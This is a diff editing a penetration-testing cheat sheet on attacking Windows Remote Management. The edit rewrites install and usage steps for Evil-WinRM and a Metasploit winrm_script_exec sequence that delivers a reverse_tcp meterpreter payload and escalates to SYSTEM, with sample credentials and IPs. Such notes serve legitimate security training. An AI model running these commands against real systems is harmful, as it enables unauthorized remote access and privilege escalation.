@@ -751,37 +751,60 @@ crackmapexec winrm -u administrator -p pqaeoirgq -x "systeminfo"
 
 ### Get a command shell using Evil-WinRM
 
-**Evil-WinRM** is a tool used for post-exploitation, allowing attackers to remotely connect to and execute commands on a Windows system via WinRM. The core script, **evil-winrm.rb**, written in Ruby, automate tasks like remote command execution, file transfers, and script execution on compromised systems. This makes it a go-to tool for penetration testers and red teamers in offensive security scenarios.
+**Evil-WinRM** is a tool designed for penetration testers to remotely connect to and execute commands on Windows systems via Windows Remote Management (WinRM). It facilitates tasks such as remote command execution, file transfers, and script execution, streamlining post-exploitation activities. Evil-WinRM requires Ruby version 2.6 or higher. Most Linux distributions come with Ruby pre-installed.
 
-- **Link to GitHub:** https://github.com/Hackplayers/evil-winrm
+**Evil-WinRM Install**
+
+You can install Evil-WinRM as a Ruby gem, which manages dependencies automatically:
 
 ```
-evil-winrm.rb -u administrator -p "pqaeoirgq" -i 10.52.6.4
+gem install evil-winrm
+```
+
+Alternatively, you can install Evil-WinRM directly from its GitHub repository. Navigate to the project directory and download the dependencies with bundler (`bundle`). 
+
+```
+git clone https://github.com/Hackplayers/evil-winrm.git
+cd evil-winrm
+bundle install
+```
+
+- Note: Bundler  is a dependency management tool for Ruby applications that's included by default in Ruby version 2.6 and later. Use `gem install bundler` to install bundler for earlier versions of Ruby.
+
+##### Running Evil-WinRM
+
+Use `evil-winrm` if you used RubyGems install or `evil-winrm.rb` if you pulled from the Github repository. The following command would start an interactive PowerShell session on the target Windows machine to allow remote command execution:
+
+```
+evil-winrm.rb -u <username> -p "<password>" -i <target>
 ```
 - `-u`= Username
 - `-p` = Password
 - `-i` = Target
 
+**Example:** 
+
+```
+evil-winrm.rb -u administrator -p "pqaeoirgq" -i 10.52.6.4
+```
+
 ### Exploitation of WinRM using Metasploit
 
-We can use the winrm_script_exec exploit module (`exploit/windows/winrm/winrm_script_exec`) for exploiting WinRM, you would need to have valid credentials for this to work so enumeration/brute force would be necessary first:
+We can use the winrm_script_exec exploit module (`exploit/windows/winrm/winrm_script_exec`) for exploiting WinRM, you would need to have valid credentials for this to work so enumeration/brute force would be necessary first.
 
-1. **Start Postgresql and the Metasploit Console**
+By default the payload will be `windows/meterpreter/reverse_tcp` which is 32-bit and fine here. Need to set the target `RHOSTS` , set the `FORCE_VBS` for the VBS CmdStager to true and then set the `USERNAME`/`PASSWORD`.  The `RPORT` will already be set to 5985 by default.  A **VBS cmdstager** is a the tool will generate and execute commands written in VBScript on a Windows machine to download, write, and execute a payload in stages. This is often used in scenarios where direct execution of a large payload isn't feasible, so the payload is staged and executed via small script commands.
+
 ```
 service postgresql start && msfconsole
-```
-
-2. **Configure the module**: By default the payload will be `windows/meterpreter/reverse_tcp` which is 32-bit and fine here. Need to set the target `RHOSTS` , set the `FORCE_VBS` for the VBS CmdStager to true and then set the `USERNAME`/`PASSWORD`.  The `RPORT` will already be set to 5985 by default.  A **VBS cmdstager** is a the tool will generate and execute commands written in VBScript on a Windows machine to download, write, and execute a payload in stages. This is often used in scenarios where direct execution of a large payload is not feasible, so the payload is staged and executed via small script commands.
-```
+use exploit/windows/winrm/winrm_script_exec
 set RHOSTS 10.52.63.52
 set FORCE_VBS true
 set USERNAME administrator
 set PASSWORD wifpoeij
-```
-3. **Run the exploit**:  This try to migrate to a System level process like services.exe, wininit.exe, svchost.exe etc for stability but should eventually migrate successfully and get a meterpreter session as  NT AUTHORITY \SYSTEM.
-```
 exploit
 ```
+
+Upon successful exploitation, After exploitation, the module will attempt to migrate the Meterpreter session to a system-level process (e.g., `services.exe`, `wininit.exe`, `svchost.exe`) for more stability and to obtain higher privileges, aiming to achieve a session as `NT AUTHORITY\SYSTEM`.
 
 # Windows-Privilege-Escalation
 
